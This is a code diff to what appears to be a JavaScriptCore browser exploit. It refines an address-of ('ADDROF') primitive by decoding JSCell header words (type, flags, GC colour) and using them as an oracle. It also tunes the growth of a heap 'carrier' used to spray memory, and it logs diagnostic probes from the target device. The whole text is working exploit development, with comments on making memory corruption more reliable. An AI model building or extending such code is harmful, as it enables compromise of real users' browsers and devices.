@@ -130,8 +130,15 @@ const CARRIER_MAX = 9000000; // 72 MB
 function growCarrier(minSlots) {
   const cap = Math.min(CARRIER_CAP, CARRIER_MAX);
   if (CARRIER_SLOTS >= cap) return false;
-  // Grow EXACTLY, with no margin: `minSlots` is the measured need
-  // (ceil(need/8)), and every byte beyond it is heap pressure for nothing.
+  // Grow EXACTLY, with no margin: every byte beyond the measured need is
+  // heap pressure for nothing, and heap pressure is what makes the GC move
+  // things at the wrong moment.
+  //
+  // Doubling was tried instead, on the reasoning that it reaches the larger
+  // draw one attempt sooner. That reasoning rested on reading `chars` as a
+  // size, which it is not -- see the head-word oracle below. With the oracle
+  // in place this branch is only reached on a build the oracle does not
+  // recognise, and that is the last place to be spending twice the heap.
   if (minSlots > cap) return false;
   CARRIER_SLOTS = Math.min(cap, Math.max(minSlots, CARRIER_SLOTS * 4));
   CARRIER_BYTES = CARRIER_SLOTS * 8;
@@ -1358,6 +1365,36 @@ function beginComposition() {
   const minimumSlots =
     Math.ceil(requiredSourceBytes / 8);
 
+  // This value is not a length. Take off the eight characters that
+  // descriptiveString() wraps around it as "Symbol(" and ")", and what is
+  // left is the second header word of the carrier function itself:
+  //
+  //     08  IndexingType = NonArrayWithContiguous
+  //     1a  m_type       = JSFunctionType
+  //     0e  m_flags
+  //     xx  m_cellState  = GC colour, 0 black / 1 white / 2 grey
+  //
+  // Hence exactly three observed values (0x0e1a08 + colour * 2^24) and the
+  // step of 2^24. Confirmed on the device: JSC-PROFILE reports
+  // fn=0x1a-fnflags=0xe, the same two bytes.
+  //
+  // Read as a size, the value demands 1.85 / 35.4 / 69 MB of carrier
+  // depending on that colour -- but no carrier size can influence a GC
+  // colour, and the check runs 50 ms AFTER the copy anyway. So it is used
+  // here as an oracle instead: did we hit the head of the right cell?
+  const HEAD_EXPECTED = 0x0e1a08;
+  const headOK =
+    (fakeChars & 0x00ffffff) === HEAD_EXPECTED && fakeChars >>> 24 <= 2;
+
+  emit(
+    "ADDROF-HEAD",
+    `word=0x${fakeChars.toString(16)}` +
+    `-type=0x${((fakeChars >>> 8) & 0xff).toString(16)}` +
+    `-flags=0x${((fakeChars >>> 16) & 0xff).toString(16)}` +
+    `-gc-colour=${fakeChars >>> 24}` +
+    `-headOK=${headOK}`
+  );
+
   emit(
     "ADDROF-COVERAGE",
     `chars=${copiedLength}` +
@@ -1374,8 +1411,11 @@ function beginComposition() {
       `-HOST2=${hex(a1)}-TARGET2=${hex(b1)}`,
   );
 
-  if (!(repeated && distinct && plausible && sourceCovered)) {
-    if (!sourceCovered && growCarrier(minimumSlots))
+  /* headOK OR the old coverage test: the oracle is the sharp probe, and
+     coverage stays as a fallback in case another build carries different
+     type numbers. This path is therefore never stricter than before. */
+  if (!(repeated && distinct && plausible && (headOK || sourceCovered))) {
+    if (!headOK && !sourceCovered && growCarrier(minimumSlots))
       emit("CARRIER-GROWN", `slots=${CARRIER_SLOTS}-bytes=${CARRIER_BYTES}`);
     finishEarlySafeAttempt(
       "ADDROF-FAIL",
